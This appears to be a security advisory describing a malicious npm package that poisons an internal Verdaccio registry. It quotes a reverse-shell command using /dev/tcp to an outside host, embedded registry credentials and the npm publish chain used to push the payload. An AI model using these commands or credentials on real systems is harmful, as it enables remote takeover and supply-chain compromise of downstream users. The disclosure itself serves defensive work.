summary: Reverse-shell dropper that poisons an internal npm registry
details: The package's only export, `command`, executes a shell chain that writes a fake package `uhclabs_local_check` to /tmp whose package.json declares `scripts.start: "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1'"` (a reverse shell to 10.0.0.145:9999), writes /tmp/.npmrc2 containing base64-encoded basic-auth credentials `pxmqa2tz6n:pxpass123`, and runs `npm publish --registry http://0.0.0.0:4873/ --userconfig /tmp/.npmrc2` to push the malicious package into a Verdaccio registry. Any consumer that requires this module and calls the exported function triggers the dropper, authenticating to the target registry with the embedded credentials and publishing a reverse-shell-bearing package that will fire when any downstream consumer of that registry installs and runs it. The package ships hardcoded third-party credentials and a working dropper — no legitimate functionality is present.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
